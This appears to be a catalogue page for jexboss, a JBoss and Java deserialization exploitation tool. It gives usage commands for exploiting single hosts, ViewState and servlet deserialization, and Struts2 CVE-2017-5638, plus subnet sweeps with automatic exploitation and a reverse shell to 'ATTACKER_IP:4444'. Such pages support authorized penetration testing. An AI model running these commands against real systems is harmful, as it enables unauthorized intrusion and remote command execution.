---
name: "jexboss"
categories:
  - blackarch-webapp
version: "86.338b531"
homepage: "https://github.com/joaomatosf/jexboss"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: Apache
meta-checked: "2026-11-09"
github-repo: "joaomatosf/jexboss"
github-stars: 2518
github-pushed: "2020-01-21"
github-archived: false
github-issues: 28
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# jexboss

> Verify-and-exploit tool for JBoss AS consoles and Java deserialization endpoints.

## What it's for

JexBoss tests and exploits JBoss Application Server (versions 3–6) and Java deserialization weaknesses in other Java platforms. In standalone mode it probes the classic JBoss vectors (`/jmx-console`, `/admin-console`, `/web-console/Invoker`, `/invoker/JMXInvokerServlet`), then offers an interactive exploit chain that deploys a shell and can drop you into a command shell. Beyond JBoss it attacks deserialization in HTTP parameters (for example `javax.faces.ViewState` in JSF/Seam apps), servlet invokers, Jenkins CLI (CVE-2015-5317), Tomcat JMX listeners (CVE-2016-8735), and Struts2 (CVE-2017-5638). It can sweep whole networks in auto-scan mode and chain straight into auto-exploitation. It is a Python 2 era tool (last release 2020) and phones home for update checks unless disabled with `-D`.

No corpus evidence — derived from upstream documentation.

## Typical use cases

### Check and exploit a single JBoss instance

Run standalone mode against one host and follow the interactive prompts.

```
jexboss -u http://198.51.100.10:8080
```

Outcome: each JBoss vector is reported as vulnerable or not; on a hit the tool deploys its web shell, and from the resulting `Shell>` prompt a reverse shell is one command away — `jexremote=ATTACKER_IP:4444` with a listener waiting on your side.

### Exploit deserialization in an HTTP parameter with a command

Target a serialized parameter (e.g. ViewState) and execute one command server-side.

```
jexboss -u https://target.example.com/page.jsf --app-unserialize -H parameter_name --cmd 'id'
```

Outcome: the named parameter is abused to execute `id` on the application server and the command output is printed; drop `--cmd` to get an interactive reverse-shell prompt instead.

### Exploit a deserializing servlet invoker

Attack endpoints that deserialize request bodies (anything exposing an Invoker).

```
jexboss -u https://target.example.com/path --servlet-unserialize
```

Outcome: the servlet endpoint is tested with a deserialization payload and, if vulnerable, you are offered the reverse-shell or one-shot-command post-exploitation menu.

### Exploit Struts2 with authentication cookies

Hit a protected `.action` behind a session.

```
jexboss -u https://target.example.com/page.action --struts2 --cookies "JSESSIONID=24517D9075136F202DCE20E9C89D424D"
```

Outcome: the CVE-2017-5638 content-type vector is sent with your session cookie attached, and successful exploitation yields the same shell options as the other modules.

### Sweep a network for vulnerable JBoss services

Scan a subnet in auto-scan mode and log the results.

```
jexboss -mode auto-scan -network 198.51.100.0/24 -ports 8080,80 -results report_auto_scan.log
```

Outcome: every host/port pair is probed for the JBoss vectors and a per-target verdict is written to the results log; add `-A` to move from detection to automatic exploitation, and `-mode file-scan -file hosts.txt -out report.log` to drive the same sweep from a prepared host list.
